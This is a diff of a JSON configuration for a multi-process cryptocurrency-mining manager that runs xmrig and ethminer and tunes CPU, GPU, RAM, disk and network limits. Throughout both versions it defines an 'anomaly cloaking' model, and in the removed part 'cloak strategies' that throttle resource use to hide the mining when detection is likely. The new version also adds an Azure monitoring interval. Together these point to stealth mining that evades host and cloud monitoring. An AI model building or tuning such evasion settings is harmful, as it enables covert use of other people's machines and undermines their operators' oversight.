@@ -1,256 +1,110 @@
 {
-  "metadata": {
-    "description": "Cấu hình quản lý tài nguyên cho hệ thống khai thác tiền điện tử với khả năng tương tác nhiều tiến trình.",
-    "version": "2.0.0",
-    "last_updated": "2024-11-17"
+  "processes": {
+    "CPU": "xmrig",
+    "GPU": "ethminer"
   },
+
+  "process_priority_map": {
+    "xmrig": 10,
+    "ethminer": 8
+  },
+
+  "network_interface": "eth0",
+
   "resource_allocation": {
     "cpu": {
-      "default_threads": 4,
-      "min_threads": 2,
-      "max_threads": 16,
-      "frequency_mhz_range": {
-        "min": 1800,
-        "max": 3500
+      "max_threads": 12,
+      "cpu_freq_range_mhz": {
+        "min": 1600,
+        "max": 3000
       }
     },
     "ram": {
-      "default_allocation_mb": 2048,
-      "min_allocation_mb": 1024,
-      "max_allocation_mb": 8192
+      "max_allocation_mb": 65536,
+      "ram_percent_threshold": 90
     },
     "gpu": {
       "usage_percent_range": {
-        "min": 0,
-        "max": 100
+        "min": 10,
+        "max": 90
       },
-      "power_limit_watts_range": {
-        "min": 100,
-        "max": 240
-      }
+      "gpu_utilization_percent_optimal": {
+        "min": 30,
+        "max": 80
+      },
+      "max_usage_percent": [90, 90]
     },
     "disk_io": {
+      "max_disk_io_mbps": 500,
       "min_limit_mbps": 10,
-      "max_limit_mbps": 100,
-      "limit_step_mbps": 1,
-      "read_limit_mbps": 80,
-      "write_limit_mbps": 80
+      "max_limit_mbps": 2000
     },
-    "network_bandwidth": {
-      "min_limit_mbps": 10,
-      "max_limit_mbps": 100,
-      "limit_step_mbps": 1
+    "network": {
+      "network_bandwidth_limit_mbps": 1000
     },
     "cache": {
-      "min_limit_percent": 10,
-      "max_limit_percent": 100,
-      "limit_percent": 70,
-      "limit_step_percent": 5
+      "cache_limit_percent": 50
     }
   },
+
+  "temperature_limits": {
+    "cpu_max_celsius": 75,
+    "gpu_max_celsius": 85
+  },
+
+  "power_limits": {
+    "total_power_watts": {
+      "max": 250
+    },
+    "per_device_power_watts": {
+      "cpu": {
+        "max": 140
+      },
+      "gpu": {
+        "max": 120
+      }
+    }
+  },
+
+  "baseline_thresholds": {
+    "cpu_usage_percent": 80,
+    "ram_usage_percent": 80,
+    "gpu_usage_percent": 80,
+    "disk_io_usage_mbps": 1000,
+    "network_usage_mbps": 2000,
+    "cache_percent": 80
+  },
+
+  "anomaly_detection_thresholds": {
+    "cpu_usage_percent": 85,
+    "ram_usage_percent": 85,
+    "gpu_usage_percent": 85,
+    "disk_io_mbps": 1000,
+    "network_bandwidth_mbps": 2000,
+    "cache_percent": 80,
+    "cpu_temperature_celsius": 80,
+    "gpu_temperature_celsius": 80,
+    "cpu_power_watts": 140,
+    "gpu_power_watts": 120
+  },
+
+  "ai_driven_monitoring": {
+    "anomaly_cloaking_model": {
+      "detection_threshold": 0.7
+    },
+    "detection_interval_seconds": 60,
+    "cloak_activation_delay_seconds": 5
+  },
+
   "monitoring_parameters": {
     "temperature_monitoring_interval_seconds": 10,
     "power_monitoring_interval_seconds": 10,
-    "anomaly_monitoring_interval_seconds": 10,
-    "cloak_activation_delay_seconds": 60,
+    "azure_monitor_interval_seconds": 300,
     "optimization_interval_seconds": 30
   },
+
   "optimization_parameters": {
-    "cpu_thread_adjustment_step": 1,
-    "ram_allocation_step_mb": 256,
-    "gpu_power_adjustment_step_watts": 10,
-    "disk_io_limit_step_mbps": 1,
-    "network_bandwidth_limit_step_mbps": 1,
-    "cache_limit_step_percent": 5
-  },
-  "ai_driven_monitoring": {
-    "resource_optimization_model": {
-      "model_path": "/app/mining_environment/models/resource_optimization_model.pt",
-      "input_features": [
-        "cpu_percent",
-        "cpu_count",
-        "cpu_freq_mhz",
-        "ram_percent",
-        "ram_total_mb",
-        "ram_available_mb",
-        "cache_percent",
-        "gpu_percent",
-        "gpu_memory_percent",
-        "gpu_temperature_celsius",
-        "disk_read_bytes",
-        "disk_write_bytes",
-        "network_sent_bytes",
-        "network_recv_bytes",
-        "cpu_temperature_celsius",
-        "battery_percent",
-        "battery_plugged"
-      ],
-      "output_features": [
-        "cpu_threads",
-        "ram_allocation_mb",
-        "gpu_usage_percent",
-        "disk_io_limit_mbps",
-        "network_bandwidth_limit_mbps",
-        "cache_limit_percent"
-      ]
-    },
-    "anomaly_cloaking_model": {
-      "model_path": "/app/mining_environment/models/anomaly_cloaking_model.pt",
-      "detection_threshold": 0.9,
-      "action_strategy": "cloak_activity"
-    }
-  },
-  "cloak_strategies": {
-    "cpu": {
-      "throttle_percentage_low": 10,
-      "throttle_percentage_high": 20,
-      "frequency_adjustment_mhz_low": 2200,
-      "frequency_adjustment_mhz_high": 2000
-    },
-    "gpu": {
-      "throttle_percentage_low": 10,
-      "throttle_percentage_high": 20
-    },
-    "network": {
-      "bandwidth_reduction_low_mbps": 5,
-      "bandwidth_reduction_high_mbps": 10,
-      "network_interface": "eth0"
-    },
-    "disk_io": {
-      "io_throttling_level_low": "normal",
-      "io_throttling_level_high": "idle"
-    },
-    "cache": {
-      "cache_limit_low_percent": 60,
-      "cache_limit_high_percent": 50
-    }
-  },
-  "network_interface": "eth0",
-  "logging": {
-    "log_level": "INFO",
-    "log_format": "%(asctime)s - %(name)s - %(levelname)s - PID:%(process)d - %(message)s",
-    "log_file": "/app/mining_environment/logs/resource_manager.log",
-    "per_process_logging": {
-      "enabled": true,
-      "log_directory": "/app/mining_environment/logs/mining_processes"
-    }
-  },
-  "strategies": {
-    "dynamic_resource_allocation": {
-      "cpu": {
-        "enable_dynamic_allocation": true,
-        "scaling_factor": 1.2
-      },
-      "ram": {
-        "enable_dynamic_allocation": true,
-        "scaling_factor": 1.1
-      },
-      "gpu": {
-        "enable_dynamic_allocation": true,
-        "scaling_factor": 1.3
-      },
-      "disk_io": {
-        "enable_dynamic_allocation": true,
-        "scaling_factor": 1.0
-      },
-      "network_bandwidth": {
-        "enable_dynamic_allocation": true,
-        "scaling_factor": 1.0
-      },
-      "cache": {
-        "enable_dynamic_allocation": true,
-        "scaling_factor": 1.0
-      }
-    },
-    "dynamic_load_distribution": {
-      "enable_dynamic_load_distribution": true,
-      "load_balance_algorithm": "round_robin",
-      "priority_levels": {
-        "high": 1,
-        "medium": 2,
-        "low": 3
-      }
-    }
-  },
-  "scaling_thresholds": {
-    "cpu_usage_percent": {
-      "increase_threshold": 80,
-      "decrease_threshold": 50
-    },
-    "gpu_usage_percent": {
-      "increase_threshold": 75,
-      "decrease_threshold": 40
-    },
-    "ram_usage_percent": {
-      "increase_threshold": 85,
-      "decrease_threshold": 60
-    }
-  },
-  "anomaly_handling": {
-    "low": {
-      "action": "log_warning"
-    },
-    "medium": {
-      "action": "reduce_resources"
-    },
-    "high": {
-      "action": "cloak_activity"
-    }
-  },
-  "mining_processes": {
-    "default_priority": 1,
-    "processes": [
-      {
-        "name": "ethminer",
-        "priority": 3,
-        "gpu_index": 0
-      },
-      {
-        "name": "xmrig",
-        "priority": 2,
-        "gpu_index": 1
-      },
-      {
-        "name": "sgminer",
-        "priority": 1,
-        "gpu_index": 0
-      }
-    ]
-  },
-  "gpu_allocation": {
-    "ethminer": 0,
-    "xmrig": 1,
-    "sgminer": 0
-  },
-  "ai_parameters": {
-    "resource_optimization_model": {
-      "learning_rate": 0.001,
-      "batch_size": 32,
-      "epochs": 10
-    },
-    "anomaly_cloaking_model": {
-      "detection_sensitivity": 0.95
-    }
-  },
-  "integration": {
-    "resource_manager": {
-      "script_path": "/app/mining_environment/scripts/resource_manager.py",
-      "log_directory": "/app/mining_environment/logs/resource_logs"
-    },
-    "setup_env": {
-      "script_path": "/app/mining_environment/scripts/setup_env.py"
-    },
-    "auxiliary_modules": {
-      "temperature_monitor": {
-        "script_path": "/app/mining_environment/scripts/auxiliary_modules/temperature_monitor.py",
-        "log_directory": "/app/mining_environment/logs/temperature_logs"
-      },
-      "power_management": {
-        "script_path": "/app/mining_environment/scripts/auxiliary_modules/power_management.py",
-        "log_directory": "/app/mining_environment/logs/power_logs"
-      }
-    }
+    "gpu_power_adjustment_step": 5,
+    "disk_io_limit_step_mbps": 2
   }
 }
-
-
